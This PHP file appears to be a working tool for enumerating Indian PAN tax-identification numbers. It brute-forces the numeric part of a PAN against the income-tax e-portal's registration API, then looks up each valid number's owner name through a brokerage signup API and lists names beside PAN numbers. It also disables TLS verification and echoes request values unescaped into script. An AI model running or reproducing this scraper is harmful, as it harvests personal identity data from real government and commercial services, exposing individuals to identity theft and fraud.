<?php

if(!empty($_REQUEST['first']) AND
!empty($_REQUEST['name']) AND
!empty($_REQUEST['last'])
){
    
    
    ?>
        <p id="statusmes" name="statusmes" ></p>
        
        <br>
    <p id="demographic" name="demographic" ></p>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>


<?php
$ranpa = $_REQUEST['ranpa'];

if($ranpa==''){
    $ranpa = '0';
}
?>

<?php


$first = $_REQUEST['first'];
$name = $_REQUEST['name'];
$last = $_REQUEST['last'];














echo '<br>';

$pan = $first.$_REQUEST['alphabet'].'P'.$name[0];


echo '<script>

GetSender(0);

function GetSender(randn){ 
$.ajax({
			url:"4.php?pan='.$pan.'&last='.$last.'&rand="+randn+"&sesid='.$sesid.'",
			method:"GET",
			error: function(){
			 GetSender(randn);
},
			success:function(data){
			
		
			      var str2 = " Service started and at  "+randn;
                         var result = str2.fontcolor("#FF3737");
                  document.getElementById("statusmes").innerHTML = "&nbsp<b>"+result+"</b>";
		
			
			
			
			    	var pdata= document.getElementById("demographic").innerHTML;
			
                  document.getElementById("demographic").innerHTML = pdata +data;
		
			if(randn=="999"){
			   	var pdata= document.getElementById("demographic").innerHTML;
			
                  document.getElementById("demographic").innerHTML = pdata +"<br><a >1000 Reached enter next alphabet</a><br>";  
                  
                  
                   var str2 = " Completed Service"+randn;
                         var result = str2.fontcolor("#06CB5A");
                  document.getElementById("statusmes").innerHTML = "&nbsp<b>"+result+"</b>";
                  
                  
                  
			}else{
			var mina  = "1";
			var randnn =  +randn + +mina;
			  GetSender(randnn);
			}
			
			
			}
});
};		   
			    </script>';
}

?>


<?php

if(!empty($_REQUEST['pan']) ){


   $randnumbp = str_pad($_REQUEST['rand'], 3, "0", STR_PAD_LEFT);


$fullpan = $_REQUEST['pan'].$randnumbp.$_REQUEST['last'];





$url = "https://eportal.incometax.gov.in/iec/registrationapi/saveEntity";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"serviceName":"checkPanDetailsService","userId":"'.$fullpan.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);



$jsondec = json_decode($resp, true);

$ecode = $jsondec['messages'][0]['code'];

if($ecode=="EF00047"){
  $pandata = '';
}else{


$url = "https://api.fyers.in/signup/v1/user/general/it_name";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"pan_no":"'.$fullpan.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
$jsondec = json_decode($resp, true);
$fn = $jsondec['data']['full_name'];

$message = $jsondec['message'];

 $pandata = '<b>'.$fn.'</b> With pan number <b><font color="#00a349">'.$fullpan.'</font></b> & <br>';
}





    
   
echo $pandata;
}
?>


